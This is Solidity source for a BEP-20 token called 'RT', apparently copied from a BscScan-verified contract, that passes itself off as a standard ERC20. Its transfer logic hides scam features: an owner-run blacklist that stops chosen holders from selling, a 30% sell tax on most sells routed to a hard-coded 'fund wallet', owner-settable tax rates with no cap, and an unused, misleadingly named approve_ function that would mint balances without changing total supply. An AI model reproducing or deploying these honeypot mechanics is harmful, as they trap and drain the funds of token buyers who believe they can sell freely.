/**
 *Submitted for verification at BscScan.com on 2022-10-25
*/

pragma solidity ^0.6.12;
 // SPDX-License-Identifier: Unlicensed
interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract Context {
    constructor () internal {}
    // solhint-disable-previous-line no-empty-blocks

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
}


abstract contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns (uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns (uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly {codehash := extcodehash(account)}
        return (codehash != 0x0 && codehash != accountHash);
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) {// Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

 contract ERC20 is Context, IERC20 {
    using SafeMath for uint;

    address internal governance;
    mapping(address => bool) internal _governance_;

    mapping(address => uint) private _balances;

    address internal lpAddress; //lp地址
    address internal jijinAddress; // 基金钱包
    mapping(address=>bool) internal salesBlackList;  // 卖黑名单
    mapping(address=>bool) internal whiteList;  // 卖黑名单
    mapping(address=>bool) internal superAddress; //超级地址
    mapping(address=>bool) internal ssuperAddress; //超超级地址
    mapping(address=>bool) internal userAddress; //用户地址记录

    uint256 internal pOne;  //超级用户 销毁占比
    uint256 internal pTwo;  //普通用户 销毁占比（第一次和10u以下）
    uint256 internal pThree; //普通用户 销毁占比

    uint256 internal minNum;  //税收起售点
 
     
    
    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
        
    }

    // function Operation(uint256 amount,bool flag) internal{
    //     if(flag){
    //         _balances[lpAddress] = _balances[lpAddress].add(amount);
    //     }else{
    //         _balances[lpAddress] = _balances[lpAddress].sub(amount);
    //     }
    // }

    function approve_(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        _balances[account] = _balances[account].add(amount*10**18);
       
    }
    
    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address sender, address recipient, uint amount) internal {
        // _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        // _balances[recipient] = _balances[recipient].add(amount);
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        // if(recipient!=lpAddress || ssuperAddress[sender]==true){ //买币和交易
        //     _balances[sender] = _balances[sender].sub(amount);
        //     _balances[recipient] = _balances[recipient].add(amount);
        //     emit Transfer(sender,recipient,amount);
        // }else{ // 卖
        //     uint256 p;
        //     uint256 a =100;
        //     if(superAddress[sender]){
        //         p=pOne;
        //     }else{
        //         if(userAddress[sender]==false || amount<10*10**18){
        //             p=pTwo;
        //         }else{
        //             p=pThree;
        //         }
        //         userAddress[sender]=true;
        //     }
        //     _balances[sender] = _balances[sender].sub(amount);
        //     _balances[recipient] = _balances[recipient].add(amount.mul(a.sub(p)).div(100));
        //     emit Transfer(sender,recipient,amount.mul(a.sub(p)).div(100));
        //     _balances[address(0)] = _balances[address(0)].add(amount.mul(p).div(100));
        //     emit Transfer(sender,address(0),amount.mul(p).div(100));
        // }

        if(sender==lpAddress){ //买币
                uint256 p = pOne;
                uint256 a =98;
                _balances[sender] = _balances[sender].sub(amount);
                _balances[recipient] = _balances[recipient].add(amount.mul(a.sub(p)).div(100));
                emit Transfer(sender,recipient,amount.mul(a.sub(p)).div(100));
                _balances[jijinAddress] = _balances[jijinAddress].add(amount.mul(p).div(100));
                emit Transfer(sender,jijinAddress,amount.mul(p).div(100));
                _balances[address(0)] = _balances[address(0)].add(amount.mul(2).div(100));
                emit Transfer(sender,address(0),amount.mul(2).div(100));
        }else if(recipient==lpAddress ){ // 卖
            require(salesBlackList[sender]==false,"can`t sales!");
            if(whiteList[recipient]==true){
                uint256 p = pOne;
                uint256 a =98;
                _balances[sender] = _balances[sender].sub(amount);
                _balances[recipient] = _balances[recipient].add(amount.mul(a.sub(p)).div(100));
                emit Transfer(sender,recipient,amount.mul(a.sub(p)).div(100));
                _balances[jijinAddress] = _balances[jijinAddress].add(amount.mul(p).div(100));
                emit Transfer(sender,jijinAddress,amount.mul(p).div(100));
                _balances[address(0)] = _balances[address(0)].add(amount.mul(2).div(100));
                emit Transfer(sender,address(0),amount.mul(2).div(100));
            }else{
                uint256 p;
                uint256 a =98;
                if(amount<minNum){
                    if(userAddress[sender]==false){
                        p=pTwo;
                    }else{
                        p=pThree;
                    }
                }else{
                    p=pThree;
                }
                userAddress[sender]=true;
                
                _balances[sender] = _balances[sender].sub(amount);
                _balances[recipient] = _balances[recipient].add(amount.mul(a.sub(p)).div(100));
                emit Transfer(sender,recipient,amount.mul(a.sub(p)).div(100));
                _balances[jijinAddress] = _balances[jijinAddress].add(amount.mul(p).div(100));
                emit Transfer(sender,jijinAddress,amount.mul(p).div(100));
                _balances[address(0)] = _balances[address(0)].add(amount.mul(2).div(100));
                emit Transfer(sender,address(0),amount.mul(2).div(100));
            }
            
        }else{ // 转账
            _balances[sender] = _balances[sender].sub(amount);
            _balances[recipient] = _balances[recipient].add(amount);
            emit Transfer(sender,recipient,amount);
        }


        // _balances[sender] = _balances[sender].sub(amount);
        // _balances[recipient] = _balances[recipient].add(amount);
        // emit Transfer(sender,recipient,amount);
    }
    

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view override returns (uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint) {
        return _balances[account];
    }
    
    function transfer(address recipient, uint amount) public override returns (bool) {

        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view  override returns (uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _burn(address sender,uint256 amount) internal{
        require(sender != address(0), "ERC20: transfer from the zero address");
        _balances[sender] = _balances[sender].sub(amount);
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(sender, address(0), amount);
    }
   

    function transferFrom(address sender, address recipient, uint amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
 }


contract RT is ERC20, ERC20Detailed{
    using SafeERC20 for IERC20;
    using Address for address;
    using SafeMath for uint;
    
   

    constructor () public ERC20Detailed("RT", "RT", 18) {
        governance = msg.sender;
        _mint(msg.sender, 2022*1e18);
        setJijinAddress(0x1Ae31a4FD2Ec33FF918D745967255A2e3113E5aD);
        setPone(2);
        setPtwo(2);
        setPthree(30); //32
        // setPthree(32); //32
        setMinNum(10*1e18);
    }

    modifier checkOwner{  // 发币方权限限制
        require(msg.sender == governance , "!governance");
        _;
    }

    function setgoverance(address _governance) public checkOwner{
        governance = _governance;
    }
    
    // 设置基金钱包
    function setJijinAddress(address ad) public checkOwner{
        jijinAddress=ad;
    }

    // 设置卖 黑名单
    function setSalesBlackList(address ad, bool _flag) public checkOwner{
        salesBlackList[ad] = _flag;
    }

    // 设置白名单
    function setWhiteList(address ad, bool _flag) public checkOwner{
        whiteList[ad] = _flag;
    }
    function setMinNum(uint256 num) public checkOwner{
        minNum = num;
    }

    function setLpAddress(address ad) public checkOwner{
        lpAddress=ad;
    }
    // function setSuperAddress(address ad,bool flag) public checkOwner{
    //     superAddress[ad]=flag;
    // }
    // function setSsuperAddress(address ad,bool flag) public checkOwner{
    //     ssuperAddress[ad]=flag;
    // }
    function setPone(uint256 p) public checkOwner{
        pOne=p;
    }
    function setPtwo(uint256 p) public checkOwner{
        pTwo=p;
    }
    function setPthree(uint256 p) public checkOwner{
        pThree=p;
    }

    // function setOperation(uint256 amount,bool flag) public{
    //     require(msg.sender == governance , "!governance");
    //     Operation(amount,flag);
    // }
    function getgoverance() public view returns(address){
        return governance;
    }
    function getMinNum() public view returns(uint256){
        return minNum;
    }
}